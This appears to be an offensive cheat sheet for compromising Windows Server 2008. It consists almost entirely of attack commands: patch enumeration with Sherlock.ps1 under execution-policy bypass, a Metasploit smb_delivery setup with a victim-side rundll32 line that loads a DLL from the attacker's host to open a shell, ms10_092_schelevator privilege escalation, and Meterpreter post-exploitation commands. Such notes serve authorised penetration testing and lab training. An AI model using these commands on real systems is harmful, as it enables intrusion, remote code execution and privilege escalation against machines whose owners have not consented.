# Windows Server

## Windows Server 2008 Enumeration

```powershell
wmic qfe
powershell.exe -ExecutionPolicy Bypass -File Sherlock.ps1
powershell.exe -ExecutionPolicy Bypass -Command "Import-Module .\Sherlock.ps1; Find-AllVulns"
```

---

## Metasploit - `smb_delivery`

```bash
use exploit/windows/smb/smb_delivery
set SRVHOST <attacker_ip>
set LHOST <attacker_ip>
set LPORT 4444
set target 0
exploit
```

### Target (Run from victim)

```cmd
rundll32.exe \\<attacker_ip>\lEUZam\test.dll,0
```

---

## Metasploit - `ms10_092_schelevator`

```bash
use exploit/windows/local/ms10_092_schelevator
set SESSION 1
set LHOST <attacker_ip>
set LPORT 4443
exploit
```

---

## Meterpreter Commands

```bash
meterpreter > getpid
meterpreter > ps
meterpreter > migrate <pid>
meterpreter > background
meterpreter > getuid
meterpreter > sysinfo
```
